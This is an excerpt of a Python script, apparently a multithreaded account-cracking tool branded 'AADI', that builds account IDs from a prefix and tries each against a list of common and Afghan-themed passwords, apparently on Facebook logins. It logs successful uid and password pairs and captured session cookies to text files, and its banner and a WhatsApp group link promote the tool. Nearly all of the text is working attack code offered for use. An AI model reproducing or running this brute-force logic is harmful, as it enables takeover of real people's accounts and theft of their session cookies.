...
os.system('xdg-open https://chat.whatsapp.com/JGCZkexEfn6KguBFVvtRQO')
...
------------------------------------------------
\033[92;m 0WN3R     :     KaMrAn BoSs
 \033[92;mF4C3B00K  :     KaMrAn BoSs
 \033[92;mStatus    :     FREE
 \033[92;mV3RS10N   :     18.1
\033[93;1m════════════════════════════════════════════════
\033[96;1m[-]              AADI ON FIRE
...
def afg():
	...
	with tred(max_workers=30) as AADI:
		...
		for psx in user:
			ids = code+psx
			passlist = [ids,psx,'first8','last8','first6','last6','57273200','102030','405060','708090','10002000','100200','700800','afghanistan','afghan1234','200300','500500','50006000','Afghan123','600700','afghan1122','afghan12345','kabul1234','۱۳۳۳۵۶۷۸۹','۱۳۳۳۵۶']
			AADI.submit(rd1,ids,passlist)
	print('\033[1;37m')
	linex()
	print(' [+] The process has completed')
...
def rd1(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\33[1;37m [AADI-XD]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				...
				if 'session_key' in po:
						...
						print('\r\r\033[1;32m [AADI-OK] '+uid+' | '+pas)
						print(' \33[1;33m[Cookies] == '+cookie)
						file_path_ok = os.path.join(folder_path, 'AADI_R_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'AADI_R_COOKIEs.txt')
						...
						#print(f'\r\r\33[1m\33[1;35m [AADI-CP] '+uid+' | '+pas+'\033[1;97m')
						file_path = os.path.join(folder_path, 'AADI-CP.txt')
	...
	try:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					uid = str(po['uid'])
					print('\r\r\033[1;32m [AADI-OK] '+uid+' | '+pas)
					file_path = os.path.join(folder_path, 'AADI_FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
